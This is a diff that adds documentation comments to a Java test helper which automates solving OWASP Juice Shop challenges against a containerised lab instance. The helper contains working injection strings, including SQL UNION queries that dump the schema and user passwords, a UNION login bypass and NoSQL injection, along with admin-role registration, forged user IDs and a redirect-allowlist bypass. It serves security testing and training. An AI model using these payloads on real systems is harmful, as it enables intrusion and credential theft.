@@ -25,6 +25,9 @@ import java.util.concurrent.TimeUnit;
 import static java.net.HttpURLConnection.HTTP_CREATED;
 import static java.net.HttpURLConnection.HTTP_OK;
 
+/**
+ * Groups application-level HTTP actions used by challenge tests while leaving assertions to the tests.
+ */
 public final class JuiceShopChallengeActions {
 
     private final JuiceShopApi api;
@@ -34,17 +37,51 @@ public final class JuiceShopChallengeActions {
     public record FeedbackAttempt(int authenticatedUserId, int forgedUserId, HttpResponse<String> response) {}
     public record FeedbackRemoval(int deletedCount, HttpResponse<String> response, boolean fiveStarsRemain) {}
 
+    /**
+     * Creates the juice shop challenge actions component and initializes the dependencies required by its methods.
+     *
+     * <p>Creates a collection of Juice Shop challenge actions using the supplied API client.</p>
+     *
+     * @param api the Juice Shop HTTP helper used to send API requests
+     */
     public JuiceShopChallengeActions(JuiceShopApi api) { this.api = api; }
 
+    /**
+     * Performs the register with mismatched passwords action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /api/Users/}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> registerWithMismatchedPasswords() throws IOException, InterruptedException {
         String email = "registration-" + System.nanoTime() + "@example.com";
         return api.post("/api/Users/", Map.of("email", email, "password", "Password123!", "passwordRepeat", "Different123!"));
     }
 
+    /**
+     * Performs the register empty user action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /api/Users/}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> registerEmptyUser() throws IOException, InterruptedException {
         return api.post("/api/Users/", Map.of("email", "", "password", "", "passwordRepeat", ""));
     }
 
+    /**
+     * Performs the view another basket action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /rest/basket/}.</p>
+     *
+     * @return the request status and basket identifiers describing the access attempt
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public BasketAttempt viewAnotherBasket() throws IOException, InterruptedException {
         var session = api.login();
         int targetBasketId = session.basketId() == 1 ? 2 : 1;
@@ -52,6 +89,15 @@ public final class JuiceShopChallengeActions {
                 api.get("/rest/basket/" + targetBasketId, session.token()));
     }
 
+    /**
+     * Performs the add products to another basket action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /rest/basket/}, {@code /api/Products/}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     @SuppressWarnings("unchecked")
     public HttpResponse<String> addProductsToAnotherBasket() throws IOException, InterruptedException {
         var session = api.login();
@@ -98,10 +144,26 @@ public final class JuiceShopChallengeActions {
         return response;
     }
 
+    /**
+     * Performs the add product to another basket action against the isolated Juice Shop test application.
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> addProductToAnotherBasket() throws IOException, InterruptedException {
         return addProductsToAnotherBasket();
     }
 
+    /**
+     * Performs the submit forged feedback action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /api/Feedbacks/}.</p>
+     *
+     * @return the authenticated and forged user IDs together with the feedback response
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     @SuppressWarnings("unchecked")
     public FeedbackAttempt submitForgedFeedback() throws IOException, InterruptedException {
         var session = api.login();
@@ -115,6 +177,15 @@ public final class JuiceShopChallengeActions {
                 api.post("/api/Feedbacks/", payload, session.token()));
     }
 
+    /**
+     * Performs the remove five star feedback action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /api/Feedbacks/}.</p>
+     *
+     * @return the feedback deletion response and metadata describing the removed record
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public FeedbackRemoval removeFiveStarFeedback() throws IOException, InterruptedException {
         var session = api.login();
         var initial = api.get("/api/Feedbacks/", session.token());
@@ -135,29 +206,77 @@ public final class JuiceShopChallengeActions {
         return new FeedbackRemoval(removed, remaining, fiveStarsRemain);
     }
 
+    /**
+     * Performs the register with admin role action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /api/Users/}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> registerWithAdminRole() throws IOException, InterruptedException {
         return api.post("/api/Users/", Map.of("email", "admin-registration-" + System.nanoTime() + "@example.com",
                 "password", "Password123!", "passwordRepeat", "Password123!", "role", "admin"));
     }
 
+    /**
+     * Performs the submit zero star feedback action against the isolated Juice Shop test application.
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> submitZeroStarFeedback() throws IOException, InterruptedException {
         return submitFeedback("Automated zero-star feedback validation", 0);
     }
 
+    /**
+     * Performs the submit forged product review action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /rest/products/1/reviews}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> submitForgedProductReview() throws IOException, InterruptedException {
         var session = api.login();
         return api.put("/rest/products/1/reviews", Map.of("author", "bender@juice-sh.op",
                 "message", "Automated review authorization verification"), session.token());
     }
 
+    /**
+     * Performs the submit crypto complaint action against the isolated Juice Shop test application.
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> submitCryptoComplaint() throws IOException, InterruptedException {
         return submitFeedback("The MD5 hashing algorithm should not be used for password storage.");
     }
 
+    /**
+     * Performs the submit vulnerable library complaint action against the isolated Juice Shop test application.
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> submitVulnerableLibraryComplaint() throws IOException, InterruptedException {
         return submitFeedback("sanitize-html 1.4.2 is a vulnerable dependency.");
     }
 
+    /**
+     * Polls challenge progress until the named Juice Shop challenge is recorded as solved.
+     *
+     * <p>Polls the challenge status before failing with an error if completion is not observed within the fixed retry count.</p>
+     *
+     * @param challengeName the Score Board name of the Juice Shop challenge to inspect
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public void waitForChallenge(String challengeName) throws IOException, InterruptedException {
         for (int i = 0; i < 20; i++) {
             if (api.isChallengeSolved(challengeName)) return;
@@ -166,30 +285,92 @@ public final class JuiceShopChallengeActions {
         throw new IllegalStateException("Challenge not completed: " + challengeName);
     }
 
+    /**
+     * Performs the retrieve nested easter egg action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> retrieveNestedEasterEgg() throws IOException, InterruptedException {
         return api.get("/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg");
     }
 
+    /**
+     * Performs the retrieve blueprint action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /assets/public/images/products/JuiceShop.stl}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> retrieveBlueprint() throws IOException, InterruptedException {
         return api.get("/assets/public/images/products/JuiceShop.stl");
     }
 
+    /**
+     * Performs the open premium page action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> openPremiumPage() throws IOException, InterruptedException {
         return api.get("/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us");
     }
 
+    /**
+     * Performs the apply imaginary continue code action against the isolated Juice Shop test application.
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> applyImaginaryContinueCode() throws IOException, InterruptedException {
         return api.sendApi("PUT", "/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj", null, null);
     }
 
+    /**
+     * Performs the bypass redirect allowlist action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /redirect?to=http://kimminich.de?pwned=https://github.com/juice-shop/juice-shop}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> bypassRedirectAllowlist() throws IOException, InterruptedException {
         return api.get("/redirect?to=http://kimminich.de?pwned=https://github.com/juice-shop/juice-shop");
     }
 
+    /**
+     * Performs the submit feedback action against the isolated Juice Shop test application.
+     *
+     * @param comment the text placed in a feedback submission
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> submitFeedback(String comment) throws IOException, InterruptedException {
         return submitFeedback(comment, 1);
     }
 
+    /**
+     * Performs the submit feedback action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /api/Feedbacks/}.</p>
+     *
+     * @param comment the text placed in a feedback submission
+     * @param rating the star rating included in the feedback
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> submitFeedback(String comment, int rating) throws IOException, InterruptedException {
         Map<String, Object> captcha = captcha();
         var response = api.post("/api/Feedbacks/", Map.of("comment", comment, "rating", rating,
@@ -200,11 +381,27 @@ public final class JuiceShopChallengeActions {
         return response;
     }
 
+    /**
+     * Performs the tamper with product description action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /api/Products/9}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> tamperWithProductDescription() throws IOException, InterruptedException {
         var session = api.login();
         return api.put("/api/Products/9", Map.of("description", "<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"), session.token());
     }
 
+    /**
+     * Performs the update all reviews via no SQL action against the isolated Juice Shop test application.
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> updateAllReviewsViaNoSql() throws IOException, InterruptedException {
         var session = api.login();
         String body = json.toJson(Map.of("id", Map.of("$ne", -1), "message", "NoSQL Injection!"));
@@ -212,10 +409,30 @@ public final class JuiceShopChallengeActions {
     }
 
 
+    /**
+     * Performs the retrieve database schema action against the isolated Juice Shop test application.
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> retrieveDatabaseSchema() throws IOException, InterruptedException {
         return searchWithUnion("sqlite_master", "sql", "'2'", "'3'");
     }
 
+    /**
+     * Performs the search with union action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /rest/products/search?q=}.</p>
+     *
+     * @param table the database table included in the lab-only UNION query
+     * @param first the expression selected as the first result column
+     * @param second the expression selected as the second result column
+     * @param third the expression selected as the third result column
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     private HttpResponse<String> searchWithUnion(String table, String first, String second, String third)
             throws IOException, InterruptedException {
         List<String> columns = new ArrayList<>(List.of(first, second, third));
@@ -231,15 +448,41 @@ public final class JuiceShopChallengeActions {
     }
 
 
+    /**
+     * Performs the retrieve user credentials action against the isolated Juice Shop test application.
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> retrieveUserCredentials() throws IOException, InterruptedException {
         return searchWithUnion("Users", "id", "email", "password");
     }
 
 
+    /**
+     * Performs the exfiltrate orders via no SQL action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /rest/track-order/}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> exfiltrateOrdersViaNoSql() throws IOException, InterruptedException {
         return api.get("/rest/track-order/" + encode("' || true || '"));
     }
 
+    /**
+     * Performs the submit rapid feedback action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /api/Feedbacks/}.</p>
+     *
+     * @param count the requested number of actions or items
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> submitRapidFeedback(int count) throws IOException, InterruptedException {
         if (count < 10) throw new IllegalArgumentException("At least ten feedback submissions are required.");
         Map<String, Object> c = captcha();
@@ -258,6 +501,14 @@ public final class JuiceShopChallengeActions {
         return last;
     }
 
+    /**
+     * Performs the like review concurrently action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /rest/products/1/reviews}, {@code /rest/products/reviews}.</p>
+     *
+     * @return the HTTP responses from the concurrent review-like requests
+     * @throws Exception if a browser, HTTP, container, or scanner operation fails
+     */
     @SuppressWarnings("unchecked")
     public List<HttpResponse<String>> likeReviewConcurrently() throws Exception {
         var session = api.login();
@@ -286,11 +537,29 @@ public final class JuiceShopChallengeActions {
         return responses;
     }
 
+    /**
+     * Performs the upload unexpected file type action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /file-upload}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> uploadUnexpectedFileType() throws IOException, InterruptedException {
         return api.uploadMultipart("/file-upload", "audit.txt", "text/plain",
                 "Juice Shop unexpected file type check".getBytes(StandardCharsets.UTF_8), null);
     }
 
+    /**
+     * Performs the upload oversized PDF action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /file-upload}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> uploadOversizedPdf() throws IOException, InterruptedException {
         byte[] bytes = new byte[120_000];
         Arrays.fill(bytes, (byte) 'A');
@@ -299,12 +568,26 @@ public final class JuiceShopChallengeActions {
         return api.uploadMultipart("/file-upload", "test.pdf", "application/pdf", bytes, null);
     }
 
+    /**
+     * Performs the use deprecated XML upload action against the isolated Juice Shop test application.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /file-upload}.</p>
+     *
+     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     public HttpResponse<String> useDeprecatedXmlUpload() throws IOException, InterruptedException {
         var session = api.login();
         return api.uploadMultipart("/file-upload", "invoice.xml", "application/xml",
                 "<?xml version=\"1.0\"?><invoice><id>1</id></invoice>".getBytes(StandardCharsets.UTF_8), session.token());
     }
 
+    /**
+     * Performs the dismiss challenge notifications action against the isolated Juice Shop test application.
+     *
+     * @param driver the Selenium WebDriver controlling the application browser
+     */
     public void dismissChallengeNotifications(WebDriver driver) {
         By notifications = By.cssSelector(
                 "app-challenge-solved-notification .challenge-solved-toast mat-card.accent-notification");
@@ -329,12 +612,23 @@ public final class JuiceShopChallengeActions {
                 + count + " challenge notifications visible.");
     }
 
+    /**
+     * Builds the cross-site imaging URL used in the corresponding Juice Shop challenge.
+     *
+     * @param baseUrl the base URL of the containerized application under test
+     * @return the URL constructed for the Cross-Site Imaging challenge
+     */
     public String crossSiteImagingUrl(String baseUrl) {
         String target = "../../../../redirect?to=https://cataas.com/cat"
                 + "?x=https://github.com/juice-shop/juice-shop";
         return baseUrl + "/#/deluxe-membership?testDecal=" + encode(target);
     }
 
+    /**
+     * Performs the ephemeral accountant login flow and returns the relevant credential or token.
+     *
+     * @return the login result associated with the ephemeral accountant challenge
+     */
     public String ephemeralAccountantLogin() {
         return "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', "
                 + "'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', "
@@ -345,6 +639,15 @@ public final class JuiceShopChallengeActions {
                 + "'1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--";
     }
 
+    /**
+     * Requests and parses the captcha challenge used by feedback actions.
+     *
+     * <p>Uses the Juice Shop endpoint {@code /rest/captcha/}.</p>
+     *
+     * @return the challenge CAPTCHA identifier and answer data
+     * @throws IOException if a required file or HTTP stream cannot be read or written
+     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
+     */
     @SuppressWarnings("unchecked")
     private Map<String, Object> captcha() throws IOException, InterruptedException {
         var result = api.get("/rest/captcha/");
@@ -352,5 +655,11 @@ public final class JuiceShopChallengeActions {
         return json.toType(result.body(), Map.class);
     }
 
+    /**
+     * URL-encodes a value for use in an application request.
+     *
+     * @param s the string that will be URL-encoded
+     * @return percent-encoded query text suitable for a Juice Shop URL
+     */
     private String encode(String s) { return URLEncoder.encode(s, StandardCharsets.UTF_8).replace("+", "%20"); }
 }
